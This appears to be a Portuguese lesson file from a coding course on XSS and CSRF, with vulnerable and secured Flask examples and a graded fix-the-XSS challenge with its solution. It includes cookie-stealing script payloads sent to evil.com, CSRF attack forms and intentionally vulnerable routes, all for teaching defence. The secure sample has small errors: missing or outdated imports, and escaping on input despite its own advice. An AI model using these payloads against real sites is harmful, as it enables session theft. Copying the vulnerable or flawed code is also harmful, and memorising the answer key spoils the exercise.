import { Lesson } from '@/types/lesson';

export const lesson: Lesson = {
  id: 'xss-e-csrf',
  moduleId: 'seguranca',
  title: 'XSS e CSRF',
  description: 'Entenda como ataques de Cross-Site Scripting e Cross-Site Request Forgery funcionam, como injetam codigo malicioso e como se proteger com escape de output, CSP e tokens CSRF',
  order: 2,
  estimatedMinutes: 30,
  sections: [
    {
      type: 'text',
      content:
        '## XSS — Cross-Site Scripting\n\nXSS e um ataque onde o invasor consegue injetar codigo JavaScript malicioso em paginas web que serao vistas por outros usuarios. Ao contrario do SQL Injection (que ataca o servidor), o XSS ataca os **usuarios** do sistema.\n\n### O que um atacante pode fazer com XSS?\n- Roubar cookies de sessao e assumir a identidade do usuario\n- Capturar tudo que o usuario digita (keylogger)\n- Redirecionar o usuario para um site falso (phishing)\n- Executar acoes em nome do usuario sem o seu conhecimento\n- Minerar criptomoedas no navegador da vitima\n- Desfigurar a aparencia da pagina\n\n### Tipos de XSS\n\n**(1) XSS Refletido (Reflected XSS)**\nO payload malicioso esta na URL ou no corpo da requisicao e e "refletido" de volta na resposta imediatamente. O usuario precisa clicar em um link malicioso.\n\nExemplo de URL maliciosa:\n```\nhttps://site.com/busca?q=<script>document.location=\'https://evil.com/?\'+document.cookie</script>\n```\n\n**(2) XSS Armazenado (Stored XSS)**\nO payload e salvo no banco de dados e executado toda vez que alguem visualiza o conteudo. O mais perigoso — nao requer que a vitima clique em um link especial. Um comentario malicioso em um blog, por exemplo.\n\n**(3) XSS baseado em DOM (DOM-based XSS)**\nO payload e executado pelo proprio JavaScript do cliente ao manipular o DOM com dados nao sanitizados. Nao passa pelo servidor.',
    },
    {
      type: 'code',
      codeExample: {
        language: 'python',
        code: '# Demonstracao de XSS — aplicacao Flask vulneravel\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n# Simulando banco de dados\ncomentarios = []\n\n# VULNERAVEL: XSS Refletido\n@app.route(\'/busca\')\ndef busca_vulneravel():\n    termo = request.args.get(\'q\', \'\')\n    # O termo e inserido diretamente no HTML sem escape\n    html = f"""\n    <html>\n    <body>\n        <h2>Resultados para: {termo}</h2>\n        <p>Nenhum resultado encontrado.</p>\n    </body>\n    </html>\n    """\n    return html\n    # Ataque: GET /busca?q=<script>alert(document.cookie)</script>\n    # O script e executado no navegador da vitima!\n\n# VULNERAVEL: XSS Armazenado\n@app.route(\'/comentario\', methods=[\'POST\'])\ndef salvar_comentario_vulneravel():\n    texto = request.form.get(\'texto\', \'\')\n    comentarios.append(texto)  # salva sem sanitizacao\n    return "Comentario salvo!"\n\n@app.route(\'/comentarios\')\ndef ver_comentarios_vulneravel():\n    lista = "".join(f"<p>{c}</p>" for c in comentarios)\n    return f"<html><body>{lista}</body></html>"\n    # Se alguem salvou <script>...</script>, sera executado\n    # para TODOS os usuarios que visitarem essa pagina!\n\n# VULNERAVEL: DOM-based XSS (JavaScript)\n# No lado do cliente, este padrao e perigoso:\ndom_xss_exemplo = """\n// NUNCA faca isso:\nconst nome = location.hash.substring(1);  // pega da URL: #<script>...\ndocument.getElementById(\'saudacao\').innerHTML = \'Ola \' + nome;\n//                                           ^--- innerHTML executa scripts!\n"""',
        filename: 'xss_vulneravel.py',
        description:
          'Tres tipos de XSS em uma aplicacao Flask: Refletido (termo de busca na URL executado como HTML), Armazenado (comentario com script salvo e executado para todos os visitantes), e DOM-based (innerHTML com dados nao sanitizados). O XSS Armazenado e o mais critico pois afeta todos os usuarios sem necessidade de interacao.',
      },
    },
    {
      type: 'code',
      codeExample: {
        language: 'python',
        code: '# CODIGO SEGURO — prevencao de XSS\nfrom flask import Flask, request, escape\nimport html\n\napp = Flask(__name__)\ncomentarios = []\n\n# SEGURO: escape do output\n@app.route(\'/busca\')\ndef busca_segura():\n    termo = request.args.get(\'q\', \'\')\n    # html.escape() converte < > " \' & em entidades HTML\n    # <script> se torna &lt;script&gt; — texto, nao codigo\n    termo_escapado = html.escape(termo)\n    return f"""\n    <html>\n    <body>\n        <h2>Resultados para: {termo_escapado}</h2>\n        <p>Nenhum resultado encontrado.</p>\n    </body>\n    </html>\n    """\n    # Ataque: <script>alert(1)</script>\n    # Renderizado como texto: &lt;script&gt;alert(1)&lt;/script&gt;\n    # O usuario ve o texto, o script NAO e executado!\n\n# SEGURO: usando templates Jinja2 (escapamento automatico)\n@app.route(\'/busca-jinja\')\ndef busca_segura_jinja():\n    termo = request.args.get(\'q\', \'\')\n    # Jinja2 com {{ }} faz escape automatico\n    template = """\n    <html>\n    <body>\n        <h2>Resultados para: {{ termo }}</h2>\n    </body>\n    </html>\n    """\n    return render_template_string(template, termo=termo)\n    # NUNCA use {{ termo | safe }} a menos que voce tenha certeza absoluta\n\n# SEGURO: XSS Armazenado — sanitizar na entrada E no output\n@app.route(\'/comentario\', methods=[\'POST\'])\ndef salvar_comentario_seguro():\n    texto = request.form.get(\'texto\', \'\')\n    # Opção 1: escapar ao salvar\n    texto_seguro = html.escape(texto)\n    comentarios.append(texto_seguro)\n    return "Comentario salvo!"\n\n# Content Security Policy (CSP) — header HTTP de seguranca\n@app.after_request\ndef adicionar_headers_seguranca(response):\n    # Bloqueia execucao de scripts nao autorizados\n    response.headers[\'Content-Security-Policy\'] = \\\n        "default-src \'self\'; script-src \'self\'; style-src \'self\'"\n    # Evita que o navegador adivinhe o tipo de conteudo\n    response.headers[\'X-Content-Type-Options\'] = \'nosniff\'\n    # Ativa o filtro XSS do navegador\n    response.headers[\'X-XSS-Protection\'] = \'1; mode=block\'\n    return response',
        filename: 'xss_seguro.py',
        description:
          'Tres camadas de defesa contra XSS: (1) html.escape() para escapar dados antes de inserir no HTML, (2) templates Jinja2 com escapamento automatico como padrao, (3) Content Security Policy (CSP) via headers HTTP que instrui o navegador a bloquear scripts nao autorizados mesmo que o escape falhe.',
      },
    },
    {
      type: 'text',
      content:
        '## CSRF — Cross-Site Request Forgery\n\nCSRF (pronuncia-se "sea-surf") e um ataque onde o invasor engana o navegador do usuario para fazer requisicoes autenticadas para outro site sem o conhecimento da vitima.\n\n### Como funciona\n\n1. A vitima esta logada no banco.com\n2. A vitima visita um site malicioso (evil.com) enquanto ainda esta logada\n3. evil.com tem codigo que faz uma requisicao para banco.com\n4. O navegador automaticamente inclui os cookies de sessao do banco.com\n5. O banco.com recebe uma requisicao autenticada que veio de evil.com\n\n**Exemplo de ataque:**\n```html\n<!-- Na pagina maliciosa evil.com -->\n<img src="https://banco.com/transferir?para=atacante&valor=10000" />\n<!-- O navegador carrega a "imagem", executando a transferencia! -->\n\n<!-- Ou com formulario automatico: -->\n<form id="ataque" action="https://banco.com/transferir" method="POST">\n  <input type="hidden" name="para" value="conta_do_atacante">\n  <input type="hidden" name="valor" value="10000">\n</form>\n<script>document.getElementById(\'ataque\').submit();</script>\n```\n\n### Diferenca entre XSS e CSRF\n- **XSS**: executa codigo no contexto do site alvo (atacando o usuario a partir do proprio site)\n- **CSRF**: usa a sessao do usuario para fazer acoes no site alvo (o site alvo nao sabe que a requisicao e maliciosa)',
    },
    {
      type: 'code',
      codeExample: {
        language: 'python',
        code: '# Prevencao de CSRF com tokens em Flask\nimport secrets\nfrom flask import Flask, request, session, abort\nfrom functools import wraps\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)  # chave secreta forte\n\n# DECORATOR: protege rotas contra CSRF\ndef requer_token_csrf(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        # Pega o token enviado pelo formulario\n        token_recebido = request.form.get(\'csrf_token\') or \\\n                         request.headers.get(\'X-CSRF-Token\')\n\n        # Pega o token armazenado na sessao do usuario\n        token_da_sessao = session.get(\'csrf_token\')\n\n        # Verifica se os tokens existem e sao iguais\n        if not token_recebido or not token_da_sessao:\n            abort(403)  # Forbidden\n\n        # compare_digest previne timing attacks\n        if not secrets.compare_digest(token_recebido, token_da_sessao):\n            abort(403)\n\n        return func(*args, **kwargs)\n    return wrapper\n\ndef gerar_token_csrf():\n    """Gera um token CSRF unico para a sessao atual."""\n    if \'csrf_token\' not in session:\n        session[\'csrf_token\'] = secrets.token_hex(32)\n    return session[\'csrf_token\']\n\n@app.route(\'/transferir\', methods=[\'GET\'])\ndef formulario_transferencia():\n    token = gerar_token_csrf()\n    # O token e embutido no formulario como campo oculto\n    return f"""\n    <form method="POST" action="/transferir">\n        <input type="hidden" name="csrf_token" value="{token}">\n        <input type="text" name="para" placeholder="Conta destino">\n        <input type="number" name="valor" placeholder="Valor">\n        <button type="submit">Transferir</button>\n    </form>\n    """\n\n@app.route(\'/transferir\', methods=[\'POST\'])\n@requer_token_csrf  # protecao CSRF aplicada\ndef executar_transferencia():\n    # So chega aqui se o token CSRF for valido\n    # Um site externo nao pode saber o token da sessao do usuario\n    conta_destino = request.form.get(\'para\')\n    valor = request.form.get(\'valor\')\n\n    # Gera novo token apos uso (token rotation)\n    session[\'csrf_token\'] = secrets.token_hex(32)\n\n    return f"Transferencia de R${valor} para {conta_destino} realizada!"\n\n# Com Flask-WTF (biblioteca popular que automatiza protecao CSRF):\n# from flask_wtf.csrf import CSRFProtect\n# csrf = CSRFProtect(app)  # protege TODOS os formularios automaticamente',
        filename: 'csrf_protecao.py',
        description:
          'Implementacao completa de protecao CSRF: geracao de token aleatorio seguro com secrets.token_hex(), armazenamento na sessao do servidor, validacao no POST com secrets.compare_digest() para prevenir timing attacks, e rotacao do token apos uso. O atacante em evil.com nao tem como saber o valor do token da sessao do usuario.',
      },
    },
    {
      type: 'callout',
      calloutType: 'tip',
      content:
        'A regra para prevenir XSS: escape TODOS os dados na saida, nao na entrada. Armazene os dados originais, escape ao renderizar. Para CSRF: use tokens sincronizados para requisicoes que mudam estado (POST, PUT, DELETE). Requisicoes GET nunca devem alterar estado — um link clicado nao deve transferir dinheiro.',
    },
  ],
  challenges: [
    {
      id: 'seguranca-c3',
      title: 'Corrija XSS em Template',
      description:
        'O sistema de comentarios abaixo tem uma vulnerabilidade de XSS Armazenado grave. Corrija a funcao de renderizacao para escapar corretamente o HTML, e adicione os 3 headers de seguranca essenciais (CSP, X-Content-Type-Options, X-Frame-Options) na funcao de headers.',
      language: 'python',
      starterCode:
        '# Sistema de comentarios — corrija a vulnerabilidade XSS\nimport html\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n# Banco de dados simulado\ncomentarios_salvos = [\n    {"autor": "Maria", "texto": "Otimo post!"},\n    {"autor": "Joao", "texto": "<script>fetch(\'https://evil.com/?c=\'+document.cookie)</script>"},\n    {"autor": "Ana", "texto": "Concordo com a Maria!"},\n]\n\ndef renderizar_comentarios(comentarios):\n    """Renderiza lista de comentarios em HTML. CORRIJA O XSS AQUI."""\n    itens = []\n    for c in comentarios:\n        # VULNERAVEL: autor e texto sao inseridos sem escape\n        item = f\'<div class="comentario"><strong>{c["autor"]}</strong><p>{c["texto"]}</p></div>\'\n        itens.append(item)\n    return "\\n".join(itens)\n\n@app.after_request\ndef adicionar_headers_seguranca(response):\n    """Adicione os 3 headers de seguranca: CSP, X-Content-Type-Options, X-Frame-Options"""\n    # TODO: adicione os headers aqui\n    return response\n\n@app.route(\'/comentarios\')\ndef ver_comentarios():\n    html_comentarios = renderizar_comentarios(comentarios_salvos)\n    return f"<html><body><h1>Comentarios</h1>{html_comentarios}</body></html>"\n',
      solution:
        '# Sistema de comentarios — XSS corrigido\nimport html as html_module\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\ncomentarios_salvos = [\n    {"autor": "Maria", "texto": "Otimo post!"},\n    {"autor": "Joao", "texto": "<script>fetch(\'https://evil.com/?c=\'+document.cookie)</script>"},\n    {"autor": "Ana", "texto": "Concordo com a Maria!"},\n]\n\ndef renderizar_comentarios(comentarios):\n    """Renderiza lista de comentarios em HTML com escape correto."""\n    itens = []\n    for c in comentarios:\n        # CORRIGIDO: escapar TODOS os dados vindos do banco antes de inserir no HTML\n        # html_module.escape() converte < em &lt;, > em &gt;, & em &amp;, etc.\n        autor_escapado = html_module.escape(c["autor"])\n        texto_escapado = html_module.escape(c["texto"])\n        item = f\'<div class="comentario"><strong>{autor_escapado}</strong><p>{texto_escapado}</p></div>\'\n        itens.append(item)\n    # O script malicioso sera exibido como texto: &lt;script&gt;...\n    # O usuario ve o codigo, mas ele NAO e executado\n    return "\\n".join(itens)\n\n@app.after_request\ndef adicionar_headers_seguranca(response):\n    """Headers de seguranca essenciais."""\n    # 1. Content Security Policy: bloqueia scripts de origens nao autorizadas\n    #    mesmo que o escape falhe\n    response.headers[\'Content-Security-Policy\'] = \\\n        "default-src \'self\'; script-src \'self\'; object-src \'none\'"\n\n    # 2. X-Content-Type-Options: impede o navegador de adivinhar o tipo MIME\n    #    evita ataques onde um arquivo .txt e executado como JavaScript\n    response.headers[\'X-Content-Type-Options\'] = \'nosniff\'\n\n    # 3. X-Frame-Options: impede que a pagina seja carregada em um iframe\n    #    previne ataques de clickjacking\n    response.headers[\'X-Frame-Options\'] = \'DENY\'\n\n    return response\n\n@app.route(\'/comentarios\')\ndef ver_comentarios():\n    html_comentarios = renderizar_comentarios(comentarios_salvos)\n    return f"<html><body><h1>Comentarios</h1>{html_comentarios}</body></html>"\n',
      hints: [
        'Use html.escape() em Python para converter caracteres especiais HTML em entidades seguras. Ex.: html.escape("<script>") retorna "&lt;script&gt;".',
        'Aplique o escape em TODOS os campos que vem do banco de dados — tanto "autor" quanto "texto". Um campo de nome de usuario tambem pode conter XSS.',
        'Para os headers: CSP usa "Content-Security-Policy", o tipo MIME usa "X-Content-Type-Options: nosniff", e para bloquear iframes use "X-Frame-Options: DENY".',
      ],
    },
  ],
};
